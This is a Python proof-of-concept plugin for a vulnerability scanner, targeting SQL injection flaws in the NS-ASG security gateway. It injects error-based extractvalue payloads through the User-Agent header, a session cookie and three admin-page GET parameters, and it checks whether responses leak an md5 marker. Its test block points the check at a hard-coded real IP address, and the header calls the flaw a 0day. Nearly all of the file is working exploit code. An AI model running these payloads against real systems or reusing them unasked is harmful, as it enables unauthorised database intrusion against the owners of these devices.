#!usr/bin/env python
# *-* coding:utf-8 *-*

'''
name: NS-ASG SQL Injection
author: yichin
refer:
    http://www.wooyun.org/bugs/wooyun-2014-058987
    0day
description:
    补漏...这下应该全了,不全也不再刷了，交给别人了
'''

def assign(service, arg):
    if service == 'ns-asg':
        return True, arg

def audit(arg):
    md5_1 = 'c4ca4238a'
    #useragent 注入
    useragent = 'a\'=extractvalue(0x1,concat(0x23,md5(1))),\'\',\'\')#'
    url = arg + '3g/index.php'
    code, head, res, err, _ = curl.curl2(url, user_agent=useragent)
    if (code == 200) and (md5_1 in res):
        security_hole('SQL Injection: {url} UA:{useragent}'.format(url=url, useragent=useragent))
    #cookie注入
    cookie = 'reachstone_uid=1 and extractvalue(0x1,concat(0x23,md5(1)))'
    url = arg + 'include/authrp.php'
    code, head, res, err, _ = curl.curl2(url, cookie=cookie)
    if (code==200) and (md5_1 in res):
        security_hole('SQL Injection: {url} Cookie: {cookie}'.format(url=url,cookie=cookie))
    #GET 报错注入
    payloads = [
        arg + 'admin/config_MT.php?action=delete&Mid=1%20and%20extractvalue(0x1,concat(0x23,md5(1)))',
        arg + 'admin/count_user.php?action=GO&search=%27%0band%0bextractvalue(0x1,concat(0x23,md5(1)))%23',
        arg + 'admin/edit_fire_wall.php?action=update&FireWallId=111%20and%20extractvalue(0x1,concat(0x23,md5(1)))',
    ]
    for payload in payloads:
        code, head, res, err, _ = curl.curl2(payload)
        if (code == 200) and (md5_1 in res):
            security_hole('SQL Injection: ' + payload)
if __name__ == '__main__':
    from dummy import *
    audit(assign('ns-asg', 'https://121.28.81.124/')[1])